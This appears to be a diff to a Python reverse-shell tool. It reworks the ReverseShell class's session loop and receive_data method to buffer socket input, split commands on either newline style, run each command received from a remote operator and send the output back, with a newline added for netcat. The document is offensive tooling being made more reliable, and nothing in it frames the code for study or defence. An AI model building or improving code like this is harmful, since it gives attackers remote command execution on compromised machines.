@@ -40,23 +40,33 @@ class ReverseShell:
                     self.sock.close()
 
     def handle_session(self):
-        """Main command session handler"""
+        """Main command session handler with keep-alive"""
         try:
+            self.buffer = b''  # Initialize buffer for partial commands
             while self.running:
-                # Receive command
-                command = self.receive_data()
-                if not command:
-                    break
+                # Check buffer first before recv
+                if b'\n' in self.buffer or b'\r\n' in self.buffer:
+                    # Extract command from buffer
+                    command, sep, remaining = self.buffer.partition(b'\n')
+                    if not sep:  # Try \r\n partition
+                        command, sep, remaining = self.buffer.partition(b'\r\n')
+                    self.buffer = remaining
+                    command = command.decode(ENCODING).strip()
+                else:
+                    # Get more data from network
+                    data = self.sock.recv(BUFFER_SIZE)
+                    if not data:
+                        break
+                    self.buffer += data
+                    continue
 
-                # Handle special commands
                 if command.lower() == 'exit':
                     break
                 if command.lower() == 'background':
                     continue
 
-                # Execute and send response
                 output = self.execute_command(command)
-                self.send_data(output)
+                self.send_data(output + "\n")  # Add newline for netcat
 
         except Exception as e:
             print(f"Session error: {str(e)}")
@@ -126,17 +136,24 @@ class ReverseShell:
                 self.running = False
 
     def receive_data(self):
-        """Receive data until newline (for command parsing)"""
+        """Handle partial reads and platform-specific newline characters"""
         try:
             data = b''
             while True:
-                chunk = self.sock.recv(1)  # Read byte by byte
+                chunk = self.sock.recv(BUFFER_SIZE)
                 if not chunk:
                     return None
-                if chunk == b'\n':
-                    break
                 data += chunk
-            return data.decode(ENCODING).strip()
+                # Check for any newline (works with both \n and \r\n)
+                if b'\n' in data or b'\r\n' in data:
+                    break
+            # Split at first newline and keep remaining data in buffer
+            command, _, remaining = data.partition(b'\n')
+            if not command:  # Handle \r\n case
+                command, _, remaining = data.partition(b'\r\n')
+            # Save remaining data for next command
+            self.buffer = remaining
+            return command.decode(ENCODING).strip()
         except Exception as e:
             print(f"Receive error: {str(e)}")
             return None
